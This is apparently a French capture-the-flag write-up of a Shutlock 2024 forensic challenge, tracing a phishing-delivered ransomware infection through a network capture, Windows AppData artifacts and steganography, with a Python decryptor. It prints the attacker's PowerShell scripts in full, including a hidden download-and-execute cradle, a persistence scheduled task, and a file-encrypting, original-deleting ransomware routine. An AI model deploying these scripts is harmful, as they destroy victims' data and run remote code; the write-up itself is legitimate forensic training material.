---
title: "Shutlock 2024 - Enquête sur le phishing des JO : Retracer l'attaque 2/2"
date: 2024-07-12T09:16:24+02:00
draft: false
toc: true
images:
tags: 
  - Shutlock 2024
  - Forensic
  - Phishing 2/2
  - Write-Up
categories:
  - CTF
---

<div>
  <img src="/posts/shutlock2024_phishing_2-2/images/shutlock.png" alt="Logo_Shutlock">
</div>

Ceci est le write-up de la deuxième partie du challenge Forensic **Enquête sur le phishing des JO** du CTF [Shutlock](https://shutlock.fr/) édition 2024 organisé par la DGSI et EPITA.

## Énoncé

```txt
Bravo !

Vous voici dans la deuxième partie de votre enquête. Le dump réseau vous a été confié avec une partie de son système de fichiers.

L'utilisatrice à qui appartiennent ces informations, est une scientifique qui travaille sur le chiffrement du système d'information des JO.

Aidez-la à déchiffrer son système de fichiers.
```

Dans cette deuxième partie, on nous donne un fichier de capture réseau **Capture.pcapng** ainsi qu'un dossier **FileSystem** qui correspond à une partie du système de fichier de l'utilisatrice.

Cette fois, nous ne sommes pas aussi guidé, on sait juste que le système a été chiffré et que l'ont doit le déchiffrer.

---

## Investigation

### Système de fichier

La première chose que j'ai fait a été de parcourir le dossier **FileSystem** afin d'essayer de trouver une piste.

En me rendant dans les dossier personnels de l'utilisatrice (**Desktop**, **Documents** et **Downloads**), je me suis rendu compte que des objets portent l'extension `.shutlock`, notamment un objet **importante_recherche.shutlock**. Les ouvrir ne sert à rien car il n'y a rien de lisible, on a surement trouvé les fichiers chiffrés.

On peut également remarquer un fichier nommé **iv** dans le dossier **Documents**, il n'a rien à faire la et on peut supposer qu'il à servit au chiffrement des données, on le met donc de côté.

On à également un dossier **AppData** mais rien n'a l'air intéressant de prime abord, on y reviendra suremment plus tard.

Après avoir fait le tour du dossier, on peut aller voir du côté de la capture réseau.

### Capture réseau

Afin d'analyser cette capture, on ouvre le fichier avec [Wireshark](https://www.wireshark.org/) (ou [Tshark](https://www.wireshark.org/docs/man-pages/tshark.html) pour la version CLI), on se rend alors compte que le fichier est très gros et que chercher "a la main" n'est pas la solution la plus efficace.

Afin de dégrossire tout ça, on va chercher à identifier l'adresse du PC en listant les adresses privées, pour ça il faut se rendre dans `Statistiques > Points de terminaison > IPV4`.

On trouve alors deux adresses IP privées, la **192.168.1.1** et la **10.0.2.15**.

On peut revenir sur la capture et filtrer les résultats pour avoir l'une ou l'autre des adresses: `ip.addr==192.168.1.1 || ip.addr==10.0.2.15`.

Bien que cela ait un peu réduit le nombre d'entrées, il rest encore beaucoup d'entrées, on remarque également qu'il y a beaucoup de requêtes TCP, on peut alors aller regarder les protocoles présents en se rendant dans `Statistiques > Hiérarchie des Protocoles`.

Le tableau qui s'affiche nous apprend qu'il y a du, TLS, du DNS mais surtout des transferts de fichiers en HTTP (JPEG, du texte, etc.). ça ressemble à une piste.

Afin de voir les fichiers échangés en HTTP, il faut se rendre dans `Fichier > Exporter Objets > HTTP...` et regrouper les adresses IPs d'un côté et les noms d'hôtes de l'autre en cliquant sur "Organiser par nom d'hôte" en haut.

On peut voir que plusieurs fichiers ont été échangés avec l'IP **172.21.195.17**, soit:

- **Enigma.ps1**
- **Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf**
- **Encrypt.ps1**
- **key.txt**
- **wallpaper.jpg**

Les plus intéressants sont **Enigma.ps1**, **Encrypt.ps1** et **key.txt**, on les téléchargent.

### Analyse des scripts

Ces scripts powershell sont très certainement ceux qui ont été utilisés pour chiffrer le PC, on va donc essayer de comprendre ce qu'ils font.

#### Enigma.ps1

```ps1
$IP_addr = '172.21.195.17:5000'

$urlFakeJob = "http://$IP_addr/Holmes/Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf"
$urlTask = "http://$IP_addr/Holmes/GetFileInfo.ps1"
$fakePlaceOffer = 'Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf'
$TaskFile = 'GetFilesInfo.ps1'

#Get the lure pdf
Invoke-WebRequest -Uri $urlFakeJob -OutFile $fakePlaceOffer

# Open the PDF file with the default PDF viewer
Start-Process -FilePath $fakePlaceOffer

### Schedule task
$taskName = "IGotYourFileInfo"

# Create the scheduled task that get some file information
$cmd = "Invoke-WebRequest -Uri $urlTask -OutFile $TaskFile ; Start-Process -FilePath $TaskFile"
schtasks /create /tn $taskName /sc HOURLY /tr $cmd

#Encrypt some file

powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile  -c "& {IEX ((New-Object Net.WebClient).DownloadString('http://$IP_addr/Holmes/Encrypt.ps1'))}"

## Change wallpaper
$webClient = New-Object System.Net.WebClient
$wallpaperUrl = "http://$IP_addr/Holmes/wallpaper.jpg"
$wallpaperPath = "$env:USERPROFILE\Desktop\wallpaper.jpg"
$webClient.DownloadFile($wallpaperUrl, $wallpaperPath)

## Set the wallpaper
$regKey = "HKCU:\Control Panel\Desktop"
Set-ItemProperty -Path $regKey -Name Wallpaper -Value $wallpaperPath
$wallpaperStyle = "3"
Set-ItemProperty -Path $regKey -Name WallpaperStyle -Value $wallpaperStyle
$tileWallpaper = "0"
Set-ItemProperty -Path $regKey -Name TileWallpaper -Value $tileWallpaper

# Forcer l'actualisation du bureau
Start-Process -FilePath "RUNDLL32.EXE" -ArgumentList "USER32.DLL,UpdatePerUserSystemParameters ,1 ,True" -Wait

## Create text file
$fileContent = "YOU HAVE BEEN INFECTED BY THE HAMOR FIND THE KEY TO RETREIVE YOUR FILE"
Set-Content "$env:USERPROFILE\Desktop\instructions.txt" -Value $fileContent
# Open text file
Invoke-Item "$env:USERPROFILE\Desktop\instructions.txt"
```

Ce script est celui qui a très certainement été lancé en premier, il va créer la tâche planifiée vu avant, chiffrer les fichiers, changer le fond d'écran et créer le fichier instructions.txt.

La seule ligne qui nous intéresse pour déchiffrer les fichier est celle la:
`powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile  -c "& {IEX ((New-Object Net.WebClient).DownloadString('http://$IP_addr/Holmes/Encrypt.ps1'))}"`

Elle appelle le script **Encrypt.ps1** qui est en charge de chiffrer les fichiers sur le bureau.

#### Encrypt.ps1

```ps1
# Define the directories to search for files
$IP_addr = '172.21.195.17:5000'
$directories = @("$env:USERPROFILE")

# Define the file extensions to encrypt
$extensions = @(".png", ".doc", ".txt", ".zip")
$keyUrl = "http://$IP_addr/Holmes/key.txt"

# Download the key from the URL
$keyContent64 = Invoke-WebRequest -Uri $keyUrl | Select-Object -ExpandProperty Content
$keyContent = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($keyContent64))

# Use SHA-256 hash function to produce a 32-byte key
$sha256 = [System.Security.Cryptography.SHA256]::Create()
$key = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($keyContent))
$iv = [System.Security.Cryptography.RijndaelManaged]::Create().IV

# Sauvegarder l'IV dans un fichier
$ivFilePath = "$env:USERPROFILE\Documents\iv"
[System.IO.File]::WriteAllBytes($ivFilePath, $iv)

# Create a new RijndaelManaged object with the specified key
$rijndael = New-Object System.Security.Cryptography.RijndaelManaged
$rijndael.Key = $key
$rijndael.IV = $iv
$rijndael.Mode = [System.Security.Cryptography.CipherMode]::CBC
$rijndael.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7


# Go through each directory
foreach ($dir in $directories) {
    # Go through each file
    Get-ChildItem -Path $dir -Recurse | ForEach-Object {
        # Check the file extension
        if ($extensions -contains $_.Extension) {
            # Generate the new file name
            $newName = $_.FullName -replace $_.Extension, ".shutlock"

            # Read the file contents in bytes
            $contentBytes = [System.IO.File]::ReadAllBytes($_.FullName)

            # Create a new encryptor
            $encryptor = $rijndael.CreateEncryptor()

            # Encrypt the content
            $encryptedBytes = $encryptor.TransformFinalBlock($contentBytes, 0, $contentBytes.Length)

            # Write the encrypted content to a file
            [System.IO.File]::WriteAllBytes($newName, $encryptedBytes)

            # Delete the original file
            Remove-Item $_.FullName
        }
    }
}
```

Grâce aux commentaires, on comprend sans lire le code, a peu près ce qu'il fait:

- Définis les extensions à cibler
- Récupère la clé et la hash via SHA-256
- Créé l'iv et le sauvegarde dans un fichier
- Créé un objet **RijndaelManaged**
- Chiffre les fichiers de manière récursive

Maintenant que l'ont sait ça, on a besoin de déterminer (même si on peut s'en douter) quel méthode de chiffrement a été utilisée, on cherche alors ce qu'est l'objet **RijndaelManaged** en Powershell et on tombe sur cet [article](https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.rijndael?view=net-8.0) qui nous explique que c'est, grosso modo, de l'**AES**.

L'AES étant un algorithme de chiffrement symétrique, il n'y a qu'une seule clé pour les deux opérations, ont a alors tout ce qu'il faut pour déchiffrer les fichiers.

### Déchiffrement des fichiers

Pour faire ça, j'ai écrit le script Python suivant:

```py
import os
import sys
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt(path_iv,path_key,file):
    iv = open(f"{path_iv}","rb").read()
    b64_key = open(f"{path_key}", "rb").read()
    key = hashlib.sha256(base64.b64decode(b64_key)).digest()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    enc_file=open(file,"rb").read()
    dec_file=unpad(cipher.decrypt(enc_file),AES.block_size)
    open(f"{file}.dec","wb").write(dec_file)

file=sys.argv[1]

iv = "path/to/iv"
key = "path/to/key"

decrypt(iv,key,file)
```

Il va permettre de déchiffrer le fichier en argument et lui rajouter l'extension **.dec**.

J'utilise ce script pour déchiffrer (au hasard) l'objet **importante_recherche.shutlock**? Afin de déterlinerquel est son extension d'origine, on peut tout simplement utiliser la commande **file** sous Linux (ou a la main en regardant le **Magic Byte**):

```txt
file importante_recherche.shutlock.dec
importante_recherche.shutlock.dec: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
```

On a donc un **.zip**, la partie **compression method=AES Encrypted** nous indique qu'il est protégé par un mot de passe.

J'ai déchiffré tous les autres fichiers mais ils ne contiennent rien d'important.

### Mot de passe de l'archive

Le système de fichier est déchiffré mais pourtant pas de flag en vue et une archive protégée par mot de passe, la suite logique est alors de la déchiffrer !

{{< admonition type=note title="Note" >}}
Il existe une technique permettant de craquer une archive chiffrée (très bien expliqué dans cet [article](https://www.acceis.fr/craquage-darchives-chiffrees-pkzip-zip-zipcrypto-winzip-zip-aes-7-zip-rar/) de [Noraj](https://pwn.by/noraj/)) mais cela fonctionne uniquement quand l'archive est chiffrée avec **ZipCrypto**, ce qui n'est pas nôtre cas ici.
{{< /admonition >}}

Malheureusement, l'archive ne nous fournir aucune piste sur ou chercher et, comme je le disais au dessus, aucun autre fichier dans le répertoire personnel de l'utilisatrice n'a d'importance (on a une image de canard ainsi que des fichiers remplis de données aléatoire). Le seul endroit ou on n'a pas encore regardé est le dossier **AppData**.

Ce dossier contient les fichiers de paramètres ainsi que pleins d'autres informations utilisées par les applications installées sur le système.

Dans ce dossier, il était possible de regarder à beaucoup d'endroits, mais un a pu me faire avance, il s'agit de **ActivitiesCache.db**.

Cette base de données située dans `FileSystem/AppData/Local/ConnectedDevicesPlatform/L.clara/` enregistre les activitées de l'utilisateur sur le poste, on peut l'ouvir avec des outils tel que [sqlitebrowser](https://sqlitebrowser.org/).

En parcourant cette dernière, dans la table **Activity**, on finit par remarque à la ligne 14 l'application **Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe!App**.

Ni une ni deux, on part explorer l'arborescence `FileSystem/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/` (**.../Packages/** contenant les données de toutes les application).

On trouve alors la BDD **plum.sqlite** (contenue dans le dossier **LocalState**) stockant le contenu des notes:

```txt
pwd importante recherche: s3cr3t_r3ch3rch3_pwd_!
```

Super ! On a enfin notre... flag ?

Bien que le mot de passe permet effectivement d'ouvrir l'archive, on obtient alors seulement deux fichiers, **chiffrement.jpeg** et **recherches_algorithmes_de_chiffrement.pdf** ne donnant aucun flag (et évidemment, **SHLK{s3cr3t_r3ch3rch3_pwd_!}** ne fonctionne pas).

### Stéganographie

Ouvrir l'archive étant une étape nécessaire dans la résolution, il est très peu probable que le flag soit caché ailleurs dans le dossier **AppData** ou dans la **capture réseau**, on va alors se concentrer sur les deux fichiers extraits sur lesquels il nous reste plus qu'a faire de la stéganographie.

J'ai alors choisit de commencer par l'image car c'est l'endroit le plus répandu en stéganographie pour cacher des choses, et pour cela, plusieurs logiciels sont possibles:

- strings: Aucun résultat
- binwalk: Aucun résultat
- Exif: Aucun résultat
- steghide: Fichier embarqué - flag.txt
- [Aperisolve](https://www.aperisolve.com): Fichier embarqué - flag.txt

Steghide et Aperisolve ont trouvés un fichier **flag.txt**, on l'extrait et on récupère le flag: `SHLK{4uri3z-v0us_cl1qu3r}`.

## Conclusion

Ce chal en deux parties était très cool car plutôt abordable en étant pas trop mal réaliste (et surtout avec du contexte !).

Seul la grosse différence de niveau entre les deux (alors qu'il sont classés comme Medium) et la fin qui sort un peu du "scope" donné par l'énoncé viennent noircir un peu le tableau.

En tout cas je remercie la DGSI, EPITA, les modérateurs Discord (cc Clar'hacker !) ainsi que toutes les personnes ayant travaillés sur le CTF, je le ferais avec plaisir l'année provhaine !

## Sources

- [https://cybermeisam.medium.com/blue-team-system-live-analysis-part-8-windows-user-account-forensics-profile-folder-appdata-7f07a0870584](https://cybermeisam.medium.com/blue-team-system-live-analysis-part-8-windows-user-account-forensics-profile-folder-appdata-7f07a0870584)
- [https://medium.com/@joeforensics/digital-forensics-windows-10-timeline-activitescache-db-82b4bc9f715a](https://medium.com/@joeforensics/digital-forensics-windows-10-timeline-activitescache-db-82b4bc9f715a)
- [https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/windows-forensics](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/windows-forensics)